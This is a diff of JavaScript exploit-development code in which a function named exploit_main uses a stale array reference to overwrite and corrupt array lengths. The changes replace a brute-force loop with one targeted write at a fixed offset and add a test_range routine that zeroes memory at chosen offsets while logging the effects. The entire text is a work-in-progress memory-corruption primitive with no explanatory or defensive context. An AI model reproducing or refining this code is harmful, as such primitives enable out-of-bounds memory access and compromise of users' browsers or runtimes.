@@ -77,20 +77,21 @@ exploit_main = function(){
 	var attempts = corrupted["attempts"];
 	
 	//modify length loop
-	for(var i = 0; i < 15000; i++){
+	/*
+	for(var i = 0; i < 10000; i++){
 		stale[i] = 0x0FFFFFFF - i;
-		debug(attempts[i].length);
-		if(attempts[i].length != 20){
-			debug(i);
-			return corrupted;
-		}
 	}
-	
+	*/
+
+	stale[8370] = 0x40000000;
 
 	//release info
 	debug("found the snitch!");
-	debug(attempts[i].length);
-	debug(0x0FFFFFFF - attempts[i].length);
+	debug(attempts[0].length);
+	//debug(0x0FFFFFFF - attempts[i].length);
+
+
+
 	return corrupted;
 
 	/*
@@ -107,5 +108,20 @@ exploit_main = function(){
 
 
 	//debug("done");
+	return corrupted;
+}
+
+test_range = function(corrupted, offset, range){
+
+	var stale = corrupted.stale;
+	var target = corrupted.attempts[0];
+
+	for(var i = 0; i < range; i++){
+		debug("changing @ stale[" + (offset + i) + "]");
+		debug("before change, stale[i] = " + stale[offset + i]);
+		stale[offset + i] = 0x0;
+		debug(target[0]);
+	}
+
 	return corrupted;
 }
